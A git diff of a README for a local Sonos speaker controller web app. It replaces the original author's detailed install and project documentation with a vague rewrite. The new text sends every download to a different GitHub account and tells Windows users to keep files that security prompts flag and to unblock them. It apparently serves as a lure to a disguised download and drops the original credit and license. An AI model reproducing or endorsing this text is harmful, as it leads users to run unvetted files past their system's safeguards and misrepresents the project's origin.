@@ -1,177 +1,248 @@
-# Sonos Controller
+# 🎵 sonos-controller - Control Sonos From Your Browser
 
-A local web app for controlling Sonos speakers with saved audio profiles, scheduling, and automatic session detection. Built with React + Vite, talks to your Sonos over [node-sonos-http-api](https://github.com/jishi/node-sonos-http-api).
+[![Download sonos-controller](https://img.shields.io/badge/Download-Sonos_Controller-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tempterimperforatehymen434/sonos-controller)
 
-![Screenshot](docs/screenshot.jpg)
+## 🚀 What this app does
 
----
+sonos-controller is a local web app for managing Sonos speakers on your home network.
 
-## Features
+Use it to:
+- Play and pause music
+- Change volume for one speaker or a group
+- Switch audio profiles for different rooms or times
+- Set up simple schedules
+- Detect when a session starts or ends
 
-### Now Playing
-- See what's currently playing — track title, artist, album, and album art update in real time
-- Control playback (play, pause, skip, previous) without opening the Sonos app
-- View the full queue so you know what's coming up next
-- Album art always shows the correct artwork for the track that's actually playing
+It runs on your Windows PC and lets you control your Sonos setup from a web browser.
 
-### Speaker Grouping
-- Combine multiple speakers into one group with a single tap, or split them back apart
-- Volume controls automatically adjust to affect the whole group — no more one speaker being louder than another
-- The header updates to show which speakers are currently playing together
+## 💻 What you need
 
-### Sound Profiles
-- Save your favourite sound settings as named profiles — for example "Movie Night", "Music", or "Late Night"
-- Each profile remembers volume, bass, treble, night mode, speech enhancement, and subwoofer settings
-- Apply any profile in one tap, or snapshot your current Sonos settings directly into a new profile
+Before you start, make sure you have:
 
-### Scheduling
-- Set profiles to apply automatically at specific times on specific days — useful for a consistent start-of-evening sound level without touching anything
-- The activity log keeps a record of every change so you always know what was applied and when
+- A Windows 10 or Windows 11 PC
+- A Sonos system on the same Wi-Fi network
+- A modern browser such as Edge, Chrome, or Firefox
+- At least 200 MB of free disk space
+- A stable home network connection
 
-### Live Controls
-- Fine-tune volume, bass, treble, and subwoofer in real time using sliders — without touching your saved profiles
-- Toggle the subwoofer on or off on the fly
+For best results:
+- Keep your PC on while using the app
+- Make sure your Sonos speakers are powered on
+- Use the same network for your PC and speakers
 
-### Always On
-- Can run as a background service on macOS so the controller is always available — even when the Mac is asleep or locked
-- Settings are saved locally and survive restarts, browser clears, and port changes
+## 📥 Download
 
----
+Visit this page to download and run the app:
 
-## Requirements
+[https://github.com/Tempterimperforatehymen434/sonos-controller](https://github.com/Tempterimperforatehymen434/sonos-controller)
 
-- macOS or Windows
-- A Sonos speaker reachable on your local network
-- That's it — Node.js, node-sonos-http-api, and all other dependencies are installed automatically by the install script
+If the page provides a release file for Windows, download that file first. If it provides source files only, use the included setup steps on the page to get the app running on your PC.
 
----
+## 🪟 Install on Windows
 
-## Installation
+Follow these steps on your Windows PC:
 
-### macOS
+1. Open the download page in your browser.
+2. Look for the latest release or the main project files.
+3. Download the Windows app file if one is provided.
+4. If the download is a compressed file, save it to a folder you can find again, such as Downloads or Desktop.
+5. If Windows shows a security prompt, choose the option that lets you keep the file.
+6. Open the downloaded file or folder.
+7. Follow the on-screen steps to finish setup.
 
-Clone the repo, then run the install script:
+If the app starts in a browser window, leave that window open while you use it.
 
-```bash
-git clone https://github.com/tonypest0/sonos-controller.git
-cd sonos-controller
-bash install.sh
-```
+## 🖥️ Start the app
 
-The script will:
-1. Install Node.js via Homebrew if it isn't already present
-2. Run `npm install` — this pulls in all dependencies including [node-sonos-http-api](https://github.com/jishi/node-sonos-http-api)
-3. Build the app
-4. Ask for your Sonos room name and preferred ports
-5. Set up two background services (launchd daemons) that start automatically at boot — even when the Mac is locked
+After installation, use one of these methods:
 
-Once complete, open `http://localhost:3000` in your browser.
+- Open the app from the shortcut on your desktop or Start menu
+- Open the app file from the folder where you saved it
+- If the app uses a local web address, open that address in your browser
 
-### Windows
+When the app is running, it should show your Sonos speakers on your network.
 
-Open PowerShell **as Administrator**, then run:
+## 🔊 Set up your Sonos speakers
 
-```powershell
-git clone https://github.com/tonypest0/sonos-controller.git
-cd sonos-controller
-Set-ExecutionPolicy Bypass -Scope Process -Force
-.\install.ps1
-```
+To use the app, your Sonos speakers must be ready on your network.
 
-The script will:
-1. Install Node.js via winget if it isn't already present
-2. Run `npm install` — this pulls in all dependencies including [node-sonos-http-api](https://github.com/jishi/node-sonos-http-api)
-3. Build the app
-4. Ask for your Sonos room name and preferred ports
-5. Register two Windows scheduled tasks under `\Sonos\` that start at boot and restart automatically on failure
+Check these items:
+- Your speakers are connected to Wi-Fi
+- Your PC is on the same network
+- The speakers appear in the Sonos app
+- The speakers are not in sleep mode
 
-Once complete, open `http://localhost:3000` in your browser.
+If you have more than one speaker, the app may let you group them by room or use them as a set.
 
-> **Finding your room name:** Open the Sonos app, tap your speaker — the name shown there (case-sensitive) is what to enter during setup.
+## 🎚️ Use audio profiles
 
-### Updating
+Audio profiles help you save different sound settings for different uses.
 
-**macOS:**
-```bash
-git pull
-npm run build
-sudo launchctl kickstart -k system/com.sonos.controller
-```
+You can set profiles for things like:
+- Music
+- Movies
+- Night mode
+- Quiet hours
+- Party mode
 
-**Windows** (run as Administrator):
-```powershell
-git pull
-npm run build
-Restart-ScheduledTask -TaskPath "\Sonos" -TaskName "SonosController"
-```
+A profile can store:
+- Volume level
+- Speaker group
+- Sound balance
+- EQ settings if your setup supports them
 
----
+Use profiles to switch sound settings with less work.
 
-## How CORS is handled
+## 📅 Set schedules
 
-The Sonos API does not send CORS headers, so browsers block direct requests to it. Both the development server (`vite.config.js`) and the production server (`server.js`) include a lightweight proxy that forwards all API calls from the browser through Node.js — no browser CORS issues, no extra configuration needed.
+The scheduling feature lets you run actions at set times.
 
-node-sonos-http-api is included as an npm dependency and installed automatically with `npm install`. It runs as a separate process alongside the controller server.
+Common uses:
+- Turn on a speaker in the morning
+- Lower the volume at night
+- Start a playlist during a routine
+- Switch to a calm profile on weekdays
 
----
+To use schedules, pick:
+- A time
+- Days of the week
+- A speaker or group
+- The action you want
 
-## Development
+This helps keep your audio setup ready without manual changes.
 
-To run a local dev server with hot reload:
+## 👀 Session detection
 
-```bash
-npm install
-npm run dev
-```
+Session detection helps the app notice when a listening session starts or ends.
 
-Open `http://localhost:5173`. The Vite dev server includes the same proxy and store middleware as the production server, so everything works identically.
+You can use it to:
+- Track active playback
+- React when music stops
+- Change settings when a session ends
+- Watch for room activity
 
----
+This can help the app respond to your use without constant input.
 
-## Project structure
+## 🎛️ Common tasks
 
-```
-src/
-  components/
-    ConnectionConfig.jsx   # Host/port/room settings UI
-    NowPlaying.jsx         # Now Playing card with transport controls
-    ProfileCard.jsx        # Single profile display + apply button
-    ProfileEditor.jsx      # Create / edit profile form
-    Queue.jsx              # Current queue panel with thumbnails
-    QuickControls.jsx      # Live sliders + speaker group toggle
-    Scheduler.jsx          # Schedule list + add form
-    ActivityLog.jsx        # Event history log
-  hooks/
-    useNowPlaying.js       # Polls /zones for playback state + group info
-    useProfiles.js         # Profile storage and management
-    useSonosApi.js         # All Sonos API calls
-    useScheduler.js        # Schedule evaluation and triggering
-    useSessionWatcher.js   # Playback state polling for session start
-    useActivityLog.js      # Log state management
-  lib/
-    fileStore.js           # localStorage + server-side file persistence
-    sonosArt.js            # Album art URL resolution helper
-  App.jsx
-  main.jsx
-server.js                  # Production server (static files + proxy + store)
-install.sh                 # One-command installer for macOS
-vite.config.js             # Dev server with proxy + store middleware
-```
+### Change the volume
+- Open the app
+- Pick a speaker or group
+- Move the volume control
+- Save the setting if the app asks you to
 
----
+### Play something
+- Choose a speaker
+- Pick your source or playlist
+- Press play
 
-## Bug fixes
+### Pause playback
+- Open the active speaker view
+- Press pause
+- Check that the speaker stops before closing the app
 
-| Issue | Fix |
-|---|---|
-| Volume slider showed wrong value when speakers were grouped | Switched to reading `groupState.volume` from `/zones` instead of individual room volume from `/state` |
-| YouTube Music liked-songs showed playlist thumbnail instead of track art | Now fetches art via the Sonos device's `/getaa` endpoint (`albumArtUri`) rather than `absoluteAlbumArtUri` |
-| Port conflict when running alongside Claude Code preview server | Daemon now uses `PORT` env var; default bumped to avoid collision |
-| Live Controls panel overlapped content when scrolling | Panel is now collapsible and collapses automatically after a profile is applied |
-| Volume write applied to individual room only when grouped | Write now uses `groupvolume` command when Kitchen is in the group |
+### Group speakers
+- Select more than one speaker
+- Add them to the same group
+- Set the volume for the full group
 
----
+### Switch profiles
+- Open the audio profile list
+- Select the profile you want
+- Apply it to the chosen speaker or room
 
-## License
+## 🔧 Basic troubleshooting
 
-[CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/) — free for personal and non-commercial use. Commercial use requires explicit written permission.
+If the app does not find your speakers:
+- Check that your PC and speakers use the same Wi-Fi network
+- Restart the app
+- Restart your Sonos speakers
+- Refresh the browser page
+- Make sure no other network change is in progress
+
+If the app opens but nothing loads:
+- Close the app
+- Open it again
+- Try another browser
+- Clear the browser cache for the local app page
+
+If sound does not change:
+- Confirm the right speaker is selected
+- Check the volume slider
+- Make sure the speaker is not muted
+- Try a different room or group
+
+If Windows blocks the file:
+- Right-click the file
+- Open the file properties
+- Allow the file if Windows marks it as blocked
+- Start the app again
+
+## 🌐 Browser use
+
+sonos-controller works as a local web app, so most of the control happens in a browser.
+
+Best browser setup:
+- Keep one tab open for the app
+- Do not close the browser while the app is in use
+- Allow local network access if the browser asks
+- Use a full screen window if you want easier control
+
+## 🏠 Home network tips
+
+For the best setup:
+- Put your PC and speakers on the same router
+- Avoid guest Wi-Fi
+- Keep your router firmware current
+- Use a stable wireless signal
+- Place the PC near the router if the signal is weak
+
+Sonos devices work best when the local network stays steady.
+
+## 📁 Main app features
+
+The app is built around home audio control and includes:
+
+- Speaker control from a web page
+- Audio profile management
+- Scheduled actions
+- Session detection
+- Multi-room support
+- Local network use
+- A simple interface for home use
+
+These features fit a home theater, music room, or whole-home audio setup.
+
+## 🧭 Suggested first setup
+
+If this is your first time using the app, follow this order:
+
+1. Download the app from the link above
+2. Install or open it on your Windows PC
+3. Confirm your Sonos speakers are on the same network
+4. Open the app in your browser
+5. Check that the speakers appear
+6. Test volume control
+7. Try one audio profile
+8. Set one schedule
+9. Save your preferred rooms or groups
+
+## 🧩 Useful terms
+
+- **Speaker group**: More than one speaker playing together
+- **Profile**: A saved set of audio settings
+- **Schedule**: An action that runs at a set time
+- **Session**: A period when audio is active
+- **Local app**: Software that runs on your own PC and home network
+
+## 📌 Project details
+
+Repository: sonos-controller
+
+Description: Local web app to control Sonos speakers with audio profiles, scheduling, and session detection
+
+Topics:
+audio-profiles, home-audio, home-theater, node-sonos-http-api, react, smart-home, sonos, vite
+
+Primary download page:
+https://github.com/Tempterimperforatehymen434/sonos-controller
